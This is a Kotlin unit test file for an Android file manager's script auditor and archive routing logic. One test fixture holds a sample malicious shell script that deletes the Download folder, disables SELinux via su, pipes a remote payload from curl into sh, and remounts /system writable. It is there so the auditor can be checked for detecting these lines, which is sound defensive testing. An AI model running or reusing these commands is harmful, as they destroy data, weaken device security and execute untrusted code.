/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class ScriptArchiveHandlingTest {

    @Test
    fun testNonExecutableDocumentsClassification() {
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("notes.txt"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("data.json"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("layout.xml"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("image.png"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("music.mp3"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("video.mp4"))

        // Shell scripts and binaries are NOT non-executable documents
        assertFalse(ScriptRunnerHelper.isNonExecutableDocument("install.sh"))
        assertFalse(ScriptRunnerHelper.isNonExecutableDocument("run.bash"))
        assertFalse(ScriptRunnerHelper.isNonExecutableDocument("binary.bin"))
    }

    @Test
    fun testScriptTextAuditorDetectsDangerousOperations() {
        val dangerousScript = """
            #!/bin/sh
            echo "Starting installation"
            rm -rf /storage/emulated/0/Download/*
            su -c "setenforce 0"
            curl -s https://example.com/payload.sh | sh
            mount -o remount,rw /system
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(dangerousScript)
        assertTrue("Should detect file deletion", report.deletions.isNotEmpty())
        assertTrue("Should detect root calls", report.rootCalls.isNotEmpty())
        assertTrue("Should detect network calls", report.networkCalls.isNotEmpty())
        assertTrue("Should detect system partition operations", report.systemPaths.isNotEmpty())
        assertTrue("Total findings should be > 0", report.totalFindings >= 4)
    }

    @Test
    fun testScriptTextAuditorCleanScript() {
        val safeScript = """
            #!/bin/sh
            echo "Hello, OpenManager!"
            VAR=123
            echo "Result: ${'$'}VAR"
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(safeScript)
        assertEquals(0, report.totalFindings)
        assertTrue(report.deletions.isEmpty())
        assertTrue(report.rootCalls.isEmpty())
        assertTrue(report.networkCalls.isEmpty())
        assertTrue(report.systemPaths.isEmpty())
    }

    @Test
    fun testArchiveScriptRoutingToTextEditorSimulation() {
        // Simulating the routing decision logic in FileListFragment.openFile
        fun shouldOpenInScriptRunner(isArchivePath: Boolean, isExecutable: Boolean): Boolean {
            return !isArchivePath && isExecutable
        }

        fun isEditableScriptDocument(extension: String): Boolean {
            val supportedScriptExtensions = setOf(
                "txt", "text", "log", "md", "markdown", "json", "xml", "html", "htm", "css", "csv",
                "properties", "ini", "conf", "yaml", "yml", "toml", "java", "kt", "smali", "c", "cpp", "h",
                "sh", "bash", "zsh", "py", "pyw", "lua", "js", "ts", "jsx", "tsx", "sql", "gradle",
                "groovy", "rb", "pl", "php", "go", "rs", "bat", "cmd", "ps1", "env", "rc", "diff", "patch"
            )
            return extension.lowercase() in supportedScriptExtensions
        }

        // Inside an archive, clicking a script MUST NOT route to ScriptRunner
        val isInsideArchive = true
        val isShScript = true
        assertFalse(
            "Inside archive, script must never be sent to ScriptRunner",
            shouldOpenInScriptRunner(isInsideArchive, isShScript)
        )

        // Inside an archive, .sh must be treated as editable text document
        assertTrue(
            "Inside archive, .sh must open in text editor",
            isEditableScriptDocument("sh")
        )
        assertTrue(
            "Inside archive, .bash must open in text editor",
            isEditableScriptDocument("bash")
        )
        assertTrue(
            "Inside archive, .py must open in text editor",
            isEditableScriptDocument("py")
        )
        assertTrue(
            "Inside archive, .lua must open in text editor",
            isEditableScriptDocument("lua")
        )

        // Outside an archive, on real Linux filesystem, it CAN route to ScriptRunner
        val isOutsideArchive = false
        assertTrue(
            "Outside archive, shell script can open ScriptRunner action dialog",
            shouldOpenInScriptRunner(isOutsideArchive, isShScript)
        )
    }
}
